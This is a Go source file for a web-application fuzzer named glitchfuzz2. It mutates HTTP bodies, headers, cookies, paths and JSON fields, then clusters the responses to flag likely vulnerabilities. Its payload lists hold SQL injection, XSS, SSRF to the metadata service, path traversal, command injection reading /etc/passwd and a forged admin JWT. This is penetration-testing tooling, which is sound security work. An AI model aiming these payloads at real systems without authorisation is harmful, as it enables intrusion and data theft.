// glitchfuzz2/main.go
// GLITCHICONS — Advanced Mutation Fuzzer v2.7.0
//
// Modes:
//   body    — mutate HTTP request body (JSON/XML/form-aware)
//   header  — fuzz HTTP headers
//   cookie  — fuzz cookie values
//   path    — fuzz URL path segments
//   json    — JSON field-level fuzzing with type mutation
//
// Features:
//   - Grammar-aware JSON mutation (preserves structure)
//   - Response clustering (bucket similar responses by size+status)
//   - Smart baseline diffing (only report interesting deviations)
//   - Built-in rate limiter (token bucket)
//   - Concurrent goroutine pool
//   - Finding generation per interesting cluster
//
// Usage:
//   glitchfuzz2 body   --url https://api.target.com/search --data '{"q":"FUZZ"}'
//   glitchfuzz2 header --url https://target.com/ --header "X-Custom: FUZZ"
//   glitchfuzz2 cookie --url https://target.com/ --cookie "session=FUZZ"
//   glitchfuzz2 path   --url https://target.com/api/FUZZ/profile
//   glitchfuzz2 json   --url https://api.target.com/v1/user --data '{"id":1}'
//   glitchfuzz2 --version

package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

const Version = "2.7.0"

// ── Payloads ────────────────────────────────────────────

// Core mutation payloads
var bodyPayloads = []string{
	// SQLi
	"'", "''", "' OR '1'='1", "' OR 1=1--", "1 AND SLEEP(3)--",
	"' UNION SELECT NULL--", "admin'--", "1; DROP TABLE users--",
	// XSS
	"<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>",
	"javascript:alert(1)", "'><svg onload=alert(1)>",
	// SSTI
	"{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
	// SSRF
	"http://169.254.169.254/", "http://localhost/admin",
	"file:///etc/passwd", "dict://localhost:6379/info",
	// Path traversal
	"../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
	// Command injection
	"; id", "| id", "` id `", "$(id)", "; cat /etc/passwd",
	// Null/empty
	"", "null", "undefined", "NaN", "0", "-1",
	// Overflow
	"A" + strings.Repeat("A", 1000), strings.Repeat("A", 65535),
	// Format string
	"%s%s%s%s", "%x%x%x%x", "%n%n%n%n",
	// Unicode
	"\u0000", "\uffff", "\u202e",
}

var headerPayloads = []string{
	"../../../etc/passwd",
	"<script>alert(1)</script>",
	"http://169.254.169.254/latest/meta-data/",
	"' OR '1'='1",
	"{{7*7}}",
	"localhost",
	"127.0.0.1",
	"0.0.0.0",
	"*",
	"null",
	strings.Repeat("A", 8192), // Header overflow
	"gzip, deflate, br, zstd, identity, *",
}

var cookiePayloads = []string{
	"' OR '1'='1",
	"admin",
	"1",
	"true",
	"null",
	"undefined",
	"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.", // none alg JWT
	"../../../../etc/passwd",
	strings.Repeat("A", 4096),
}

var pathPayloads = []string{
	"../", "../../", "../../../",
	"..", "%2e%2e", "%2e%2e%2f",
	"admin", "config", "env", "debug",
	"../admin", "..%2fadmin",
	"null", "undefined", "0", "-1",
	"*", "%00", "%0a",
	strings.Repeat("A", 255),
}

// JSON type mutation payloads
var jsonTypeMutations = []interface{}{
	nil, true, false, 0, -1, 1.5,
	"", "null", "true", "false",
	[]interface{}{}, map[string]interface{}{},
	"' OR '1'='1", "<script>alert(1)</script>",
	"{{7*7}}", "http://169.254.169.254/",
	999999999, -999999999,
}

// ── Response cluster ─────────────────────────────────────

type ResponseCluster struct {
	StatusCode  int
	BodySizeBucket int // rounded to nearest 100 bytes
	Count       int
	Sample      string
	Payloads    []string
}

func clusterKey(status, size int) string {
	bucket := int(math.Round(float64(size)/100.0)) * 100
	return fmt.Sprintf("%d:%d", status, bucket)
}

// ── Finding ──────────────────────────────────────────────

type Finding struct {
	Title       string  `json:"title"`
	Severity    string  `json:"severity"`
	CVSS        float64 `json:"cvss"`
	CWE         string  `json:"cwe"`
	Target      string  `json:"target"`
	Description string  `json:"description"`
	Evidence    string  `json:"evidence"`
	Remediation string  `json:"remediation"`
	Source      string  `json:"source"`
}

type FuzzResult struct {
	Payload    string
	StatusCode int
	BodySize   int
	Body       string
	Duration   time.Duration
	Error      string
}

type ScanResult struct {
	Target    string      `json:"target"`
	Mode      string      `json:"mode"`
	Timestamp string      `json:"timestamp"`
	Total     int         `json:"total_requests"`
	Findings  []Finding   `json:"findings"`
	Clusters  map[string]int `json:"response_clusters"`
	Duration  string      `json:"scan_duration"`
	Version   string      `json:"scanner_version"`
}

// ── Rate limiter ─────────────────────────────────────────

type RateLimiter struct {
	mu       sync.Mutex
	tokens   float64
	maxTokens float64
	refillRate float64 // tokens per second
	lastRefill time.Time
}

func NewRateLimiter(rps float64) *RateLimiter {
	return &RateLimiter{
		tokens:    rps,
		maxTokens: rps * 2,
		refillRate: rps,
		lastRefill: time.Now(),
	}
}

func (r *RateLimiter) Wait() {
	for {
		r.mu.Lock()
		now := time.Now()
		elapsed := now.Sub(r.lastRefill).Seconds()
		r.tokens = math.Min(r.maxTokens, r.tokens+elapsed*r.refillRate)
		r.lastRefill = now

		if r.tokens >= 1 {
			r.tokens--
			r.mu.Unlock()
			return
		}
		wait := (1 - r.tokens) / r.refillRate
		r.mu.Unlock()
		time.Sleep(time.Duration(wait * float64(time.Second)))
	}
}

// ── HTTP client ───────────────────────────────────────────

func doRequest(
	client *http.Client,
	method, url, contentType, body string,
	headers map[string]string,
) FuzzResult {
	start := time.Now()
	var reqBody io.Reader
	if body != "" {
		reqBody = strings.NewReader(body)
	}

	req, err := http.NewRequest(method, url, reqBody)
	if err != nil {
		return FuzzResult{Error: err.Error()}
	}

	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	req.Header.Set("User-Agent", "Glitchicons/2.7.0 (glitchfuzz2)")

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return FuzzResult{Error: err.Error(), Duration: time.Since(start)}
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	return FuzzResult{
		StatusCode: resp.StatusCode,
		BodySize:   len(respBody),
		Body:       string(respBody),
		Duration:   time.Since(start),
	}
}

// ── Fuzzing modes ─────────────────────────────────────────

func fuzzBody(
	client *http.Client, limiter *RateLimiter,
	targetURL, method, data string,
	concurrency int, verbose bool,
) []FuzzResult {
	payloads := buildBodyPayloads(data)
	return runFuzz(client, limiter, concurrency, verbose, func(payload string) FuzzResult {
		body := strings.ReplaceAll(data, "FUZZ", payload)
		result := doRequest(client, method, targetURL, "application/json", body, nil)
		result.Payload = payload
		return result
	}, payloads)
}

func fuzzHeader(
	client *http.Client, limiter *RateLimiter,
	targetURL, headerTemplate string,
	concurrency int, verbose bool,
) []FuzzResult {
	parts := strings.SplitN(headerTemplate, ":", 2)
	if len(parts) != 2 {
		fmt.Fprintf(os.Stderr, "Invalid header format: %s\n", headerTemplate)
		return nil
	}
	headerName := strings.TrimSpace(parts[0])

	return runFuzz(client, limiter, concurrency, verbose, func(payload string) FuzzResult {
		value := strings.ReplaceAll(strings.TrimSpace(parts[1]), "FUZZ", payload)
		result := doRequest(client, "GET", targetURL, "", "",
			map[string]string{headerName: value})
		result.Payload = payload
		return result
	}, headerPayloads)
}

func fuzzCookie(
	client *http.Client, limiter *RateLimiter,
	targetURL, cookieTemplate string,
	concurrency int, verbose bool,
) []FuzzResult {
	parts := strings.SplitN(cookieTemplate, "=", 2)
	if len(parts) != 2 {
		fmt.Fprintf(os.Stderr, "Invalid cookie format: %s\n", cookieTemplate)
		return nil
	}
	cookieName := strings.TrimSpace(parts[0])

	return runFuzz(client, limiter, concurrency, verbose, func(payload string) FuzzResult {
		cookieVal := strings.ReplaceAll(strings.TrimSpace(parts[1]), "FUZZ", payload)
		result := doRequest(client, "GET", targetURL, "", "",
			map[string]string{"Cookie": fmt.Sprintf("%s=%s", cookieName, cookieVal)})
		result.Payload = payload
		return result
	}, cookiePayloads)
}

func fuzzPath(
	client *http.Client, limiter *RateLimiter,
	targetURL string,
	concurrency int, verbose bool,
) []FuzzResult {
	return runFuzz(client, limiter, concurrency, verbose, func(payload string) FuzzResult {
		url := strings.ReplaceAll(targetURL, "FUZZ", payload)
		result := doRequest(client, "GET", url, "", "", nil)
		result.Payload = payload
		return result
	}, pathPayloads)
}

func fuzzJSON(
	client *http.Client, limiter *RateLimiter,
	targetURL, method, data string,
	concurrency int, verbose bool,
) []FuzzResult {
	// Parse the JSON and mutate each field
	var obj map[string]interface{}
	if err := json.Unmarshal([]byte(data), &obj); err != nil {
		fmt.Fprintf(os.Stderr, "Invalid JSON: %v\n", err)
		return fuzzBody(client, limiter, targetURL, method, data, concurrency, verbose)
	}

	// Generate mutations: for each field, try each type mutation
	var payloads []string
	for field := range obj {
		for _, mutVal := range jsonTypeMutations {
			mutated := cloneMap(obj)
			mutated[field] = mutVal
			b, _ := json.Marshal(mutated)
			payloads = append(payloads, field+":"+string(b))
		}
	}

	return runFuzz(client, limiter, concurrency, verbose, func(encoded string) FuzzResult {
		idx := strings.Index(encoded, ":")
		actualBody := encoded[idx+1:]
		result := doRequest(client, method, targetURL, "application/json", actualBody, nil)
		result.Payload = encoded[:idx] // field name as payload marker
		return result
	}, payloads)
}

// ── Runner ────────────────────────────────────────────────

func runFuzz(
	client *http.Client, limiter *RateLimiter,
	concurrency int, verbose bool,
	fn func(string) FuzzResult,
	payloads []string,
) []FuzzResult {
	results := make([]FuzzResult, 0, len(payloads))
	var mu sync.Mutex

	sem  := make(chan struct{}, concurrency)
	var wg sync.WaitGroup

	for _, payload := range payloads {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			limiter.Wait()
			result := fn(p)

			mu.Lock()
			results = append(results, result)
			mu.Unlock()

			if verbose {
				fmt.Printf("[%d] %-40s → %d (%d bytes) %v\n",
					result.StatusCode,
					truncate(p, 40),
					result.StatusCode,
					result.BodySize,
					result.Duration.Round(time.Millisecond),
				)
			}
		}(payload)
	}
	wg.Wait()
	return results
}

// ── Analysis ──────────────────────────────────────────────

func getBaseline(client *http.Client, url, method, data string) FuzzResult {
	return doRequest(client, method, url, "application/json", data, nil)
}

func clusterResults(results []FuzzResult) map[string]*ResponseCluster {
	clusters := make(map[string]*ResponseCluster)
	for _, r := range results {
		if r.Error != "" {
			continue
		}
		key := clusterKey(r.StatusCode, r.BodySize)
		if _, ok := clusters[key]; !ok {
			clusters[key] = &ResponseCluster{
				StatusCode:     r.StatusCode,
				BodySizeBucket: int(math.Round(float64(r.BodySize)/100.0)) * 100,
				Sample:         r.Body[:min(200, len(r.Body))],
			}
		}
		c := clusters[key]
		c.Count++
		if len(c.Payloads) < 3 {
			c.Payloads = append(c.Payloads, r.Payload)
		}
	}
	return clusters
}

func buildFindings(
	url, mode string,
	baseline FuzzResult,
	results []FuzzResult,
	clusters map[string]*ResponseCluster,
) []Finding {
	var findings []Finding
	baselineKey := clusterKey(baseline.StatusCode, baseline.BodySize)

	// Find interesting clusters (different from baseline)
	for key, cluster := range clusters {
		if key == baselineKey {
			continue
		}

		// Error responses with different content
		if cluster.StatusCode == 500 {
			findings = append(findings, Finding{
				Title:    fmt.Sprintf("glitchfuzz2: Server Error 500 — %s Mode", mode),
				Severity: "HIGH",
				CVSS:     7.5,
				CWE:      "CWE-20",
				Target:   url,
				Description: fmt.Sprintf(
					"Fuzzing %s mode triggered HTTP 500 with %d payload(s). "+
						"Server errors may indicate injection vulnerabilities or unhandled edge cases.",
					mode, cluster.Count,
				),
				Evidence: fmt.Sprintf(
					"Mode: %s\nStatus: 500 (%d occurrences)\nPayloads: %s\nSample: %s",
					mode, cluster.Count,
					strings.Join(cluster.Payloads, ", "),
					truncate(cluster.Sample, 200),
				),
				Remediation: "Investigate server-side error handling. 500 errors from user input suggest unhandled injection or parsing.",
				Source:      "module:glitchfuzz2",
			})
		}

		// Significantly larger responses (potential data exfiltration)
		if cluster.BodySizeBucket > baseline.BodySize*3 && baseline.BodySize > 0 {
			findings = append(findings, Finding{
				Title:    fmt.Sprintf("glitchfuzz2: Anomalous Large Response — %s Mode", mode),
				Severity: "MEDIUM",
				CVSS:     5.9,
				CWE:      "CWE-200",
				Target:   url,
				Description: fmt.Sprintf(
					"Fuzzing produced responses %dx larger than baseline (%d vs ~%d bytes). "+
						"May indicate data leakage or injection.",
					cluster.BodySizeBucket/max(baseline.BodySize, 1),
					cluster.BodySizeBucket, baseline.BodySize,
				),
				Evidence: fmt.Sprintf(
					"Baseline: %d bytes (HTTP %d)\nAnomaly: ~%d bytes (HTTP %d)\nPayloads: %s",
					baseline.BodySize, baseline.StatusCode,
					cluster.BodySizeBucket, cluster.StatusCode,
					strings.Join(cluster.Payloads, ", "),
				),
				Remediation: "Investigate payloads that produce oversized responses for potential injection or data disclosure.",
				Source:      "module:glitchfuzz2",
			})
		}

		// Different success status (bypass)
		if cluster.StatusCode == 200 && baseline.StatusCode != 200 {
			findings = append(findings, Finding{
				Title:    fmt.Sprintf("glitchfuzz2: Access Bypass Detected — %s Mode", mode),
				Severity: "HIGH",
				CVSS:     8.1,
				CWE:      "CWE-287",
				Target:   url,
				Description: fmt.Sprintf(
					"Payloads returned HTTP 200 while baseline returned HTTP %d. "+
						"Possible access control bypass.",
					baseline.StatusCode,
				),
				Evidence: fmt.Sprintf(
					"Baseline: HTTP %d\nBypass: HTTP 200 (%d times)\nPayloads: %s",
					baseline.StatusCode, cluster.Count,
					strings.Join(cluster.Payloads, ", "),
				),
				Remediation: "Investigate payloads achieving 200 on restricted endpoints for access control bypass.",
				Source:      "module:glitchfuzz2",
			})
		}

		// Slow responses (time-based injection)
		for _, r := range results {
			if r.Duration > 3*time.Second && r.Error == "" {
				findings = append(findings, Finding{
					Title:    "glitchfuzz2: Time-Based Injection — Slow Response Detected",
					Severity: "HIGH",
					CVSS:     7.5,
					CWE:      "CWE-89",
					Target:   url,
					Description: fmt.Sprintf(
						"Request took %.1fs — significantly longer than expected. "+
							"Possible time-based SQL injection or SSRF to slow endpoint.",
						r.Duration.Seconds(),
					),
					Evidence: fmt.Sprintf(
						"Payload: %s\nDuration: %v\nStatus: %d",
						truncate(r.Payload, 80),
						r.Duration.Round(time.Millisecond),
						r.StatusCode,
					),
					Remediation: "Investigate time-based payload for blind SQL injection (SLEEP, WAITFOR, pg_sleep).",
					Source:      "module:glitchfuzz2",
				})
				goto doneTimings
			}
		}
	doneTimings:
	}

	return findings
}

// ── Helpers ───────────────────────────────────────────────

func buildBodyPayloads(template string) []string {
	if !strings.Contains(template, "FUZZ") {
		// Append payloads to all string values
		return bodyPayloads
	}
	result := make([]string, len(bodyPayloads))
	copy(result, bodyPayloads)
	return result
}

func cloneMap(m map[string]interface{}) map[string]interface{} {
	out := make(map[string]interface{}, len(m))
	for k, v := range m {
		out[k] = v
	}
	return out
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}

// ── Main ──────────────────────────────────────────────────

func main() {
	// Sub-commands
	bodyCmd   := flag.NewFlagSet("body",   flag.ExitOnError)
	headerCmd := flag.NewFlagSet("header", flag.ExitOnError)
	cookieCmd := flag.NewFlagSet("cookie", flag.ExitOnError)
	pathCmd   := flag.NewFlagSet("path",   flag.ExitOnError)
	jsonCmd   := flag.NewFlagSet("json",   flag.ExitOnError)

	// Common flags
	addCommonFlags := func(fs *flag.FlagSet) (*string, *string, *string, *int, *float64, *string, *bool, *bool) {
		url     := fs.String("url",         "",    "Target URL")
		method  := fs.String("method",      "POST","HTTP method")
		data    := fs.String("data",        "",    "Request body (use FUZZ as placeholder)")
		conc    := fs.Int("concurrency",    10,    "Concurrent goroutines")
		rate    := fs.Float64("rate",       50,    "Requests per second")
		output  := fs.String("output",      "",    "Output JSON file")
		verbose := fs.Bool("verbose",       false, "Verbose output")
		ver     := fs.Bool("version",       false, "Print version")
		return url, method, data, conc, rate, output, verbose, ver
	}

	urlB, methodB, dataB, concB, rateB, outputB, verboseB, verB := addCommonFlags(bodyCmd)
	urlH, _, _, concH, rateH, outputH, verboseH, verH             := addCommonFlags(headerCmd)
	headerFlag := headerCmd.String("header", "X-Custom: FUZZ", "Header to fuzz (Name: FUZZ)")

	urlC, _, _, concC, rateC, outputC, verboseC, _   := addCommonFlags(cookieCmd)
	cookieFlag := cookieCmd.String("cookie", "session=FUZZ", "Cookie to fuzz (name=FUZZ)")

	urlP, _, _, concP, rateP, outputP, verboseP, _   := addCommonFlags(pathCmd)
	urlJ, methodJ, dataJ, concJ, rateJ, outputJ, verboseJ, _ := addCommonFlags(jsonCmd)

	if len(os.Args) < 2 {
		fmt.Fprintf(os.Stderr, "glitchfuzz2 v%s\n\nUsage:\n", Version)
		fmt.Fprintf(os.Stderr, "  glitchfuzz2 body   --url URL --data '{\"q\":\"FUZZ\"}'\n")
		fmt.Fprintf(os.Stderr, "  glitchfuzz2 header --url URL --header 'X-Header: FUZZ'\n")
		fmt.Fprintf(os.Stderr, "  glitchfuzz2 cookie --url URL --cookie 'session=FUZZ'\n")
		fmt.Fprintf(os.Stderr, "  glitchfuzz2 path   --url https://target.com/api/FUZZ\n")
		fmt.Fprintf(os.Stderr, "  glitchfuzz2 json   --url URL --data '{\"id\":1}'\n")
		os.Exit(1)
	}

	if os.Args[1] == "--version" || os.Args[1] == "version" {
		fmt.Printf("glitchfuzz2 v%s\n", Version)
		os.Exit(0)
	}

	mode := os.Args[1]
	var cmdArgs []string
	if len(os.Args) > 2 {
		cmdArgs = os.Args[2:]
	}

	// Parse subcommand
	switch mode {
	case "body":   bodyCmd.Parse(cmdArgs)
	case "header": headerCmd.Parse(cmdArgs)
	case "cookie": cookieCmd.Parse(cmdArgs)
	case "path":   pathCmd.Parse(cmdArgs)
	case "json":   jsonCmd.Parse(cmdArgs)
	default:
		fmt.Fprintf(os.Stderr, "Unknown mode: %s\n", mode)
		os.Exit(1)
	}

	// Handle version flags
	if (mode == "body" && *verB) || (mode == "header" && *verH) {
		fmt.Printf("glitchfuzz2 v%s\n", Version)
		os.Exit(0)
	}

	// Set variables based on mode
	var (
		targetURL, method, data, outputFile string
		concurrency                          int
		rateLimit                            float64
		verbose                              bool
	)

	switch mode {
	case "body":
		targetURL, method, data = *urlB, *methodB, *dataB
		concurrency, rateLimit  = *concB, *rateB
		outputFile, verbose     = *outputB, *verboseB
	case "header":
		targetURL = *urlH
		concurrency, rateLimit = *concH, *rateH
		outputFile, verbose    = *outputH, *verboseH
	case "cookie":
		targetURL = *urlC
		concurrency, rateLimit = *concC, *rateC
		outputFile, verbose    = *outputC, *verboseC
	case "path":
		targetURL = *urlP
		concurrency, rateLimit = *concP, *rateP
		outputFile, verbose    = *outputP, *verboseP
	case "json":
		targetURL, method, data = *urlJ, *methodJ, *dataJ
		concurrency, rateLimit  = *concJ, *rateJ
		outputFile, verbose     = *outputJ, *verboseJ
	}

	if targetURL == "" {
		fmt.Fprintln(os.Stderr, "Error: --url is required")
		os.Exit(1)
	}

	if method == "" {
		method = "POST"
	}

	fmt.Printf("[glitchfuzz2 v%s] Mode: %s | Target: %s | Rate: %.0f/s | Concurrency: %d\n",
		Version, mode, targetURL, rateLimit, concurrency)

	// Setup HTTP client
	transport := &http.Transport{
		MaxIdleConns:        concurrency * 2,
		MaxIdleConnsPerHost: concurrency,
		IdleConnTimeout:     30 * time.Second,
		DisableKeepAlives:   false,
	}
	client := &http.Client{
		Timeout:   15 * time.Second,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	limiter := NewRateLimiter(rateLimit)
	start   := time.Now()

	// Get baseline
	fmt.Print("[*] Getting baseline... ")
	baseline := getBaseline(client, targetURL, method, data)
	fmt.Printf("HTTP %d, %d bytes\n", baseline.StatusCode, baseline.BodySize)

	// Run fuzzing
	var results []FuzzResult
	switch mode {
	case "body":
		results = fuzzBody(client, limiter, targetURL, method, data, concurrency, verbose)
	case "header":
		results = fuzzHeader(client, limiter, targetURL, *headerFlag, concurrency, verbose)
	case "cookie":
		results = fuzzCookie(client, limiter, targetURL, *cookieFlag, concurrency, verbose)
	case "path":
		results = fuzzPath(client, limiter, targetURL, concurrency, verbose)
	case "json":
		results = fuzzJSON(client, limiter, targetURL, method, data, concurrency, verbose)
	}

	elapsed  := time.Since(start)
	clusters := clusterResults(results)
	findings := buildFindings(targetURL, mode, baseline, results, clusters)

	// Build cluster summary
	clusterSummary := make(map[string]int)
	for k, c := range clusters {
		clusterSummary[k] = c.Count
	}

	result := ScanResult{
		Target:    targetURL,
		Mode:      mode,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Total:     len(results),
		Findings:  findings,
		Clusters:  clusterSummary,
		Duration:  elapsed.Round(time.Millisecond).String(),
		Version:   Version,
	}

	// Print summary
	fmt.Printf("\n[+] Completed: %d requests in %v\n", len(results), elapsed.Round(time.Millisecond))
	fmt.Printf("[+] Response clusters: %d\n", len(clusters))
	for k, c := range clusters {
		fmt.Printf("    %s: %d responses | sample payloads: %s\n",
			k, c.Count, strings.Join(c.Payloads, ", "))
	}
	if len(findings) > 0 {
		fmt.Printf("[!] Findings: %d\n", len(findings))
		for _, f := range findings {
			fmt.Printf("    [%s] %s\n", f.Severity, f.Title)
		}
	} else {
		fmt.Println("[-] No significant findings")
	}

	// Output
	data_out, _ := json.MarshalIndent(result, "", "  ")
	if outputFile != "" {
		os.WriteFile(outputFile, data_out, 0644)
		fmt.Printf("[+] Results saved to %s\n", outputFile)
	} else {
		fmt.Println("\n" + string(data_out))
	}
}
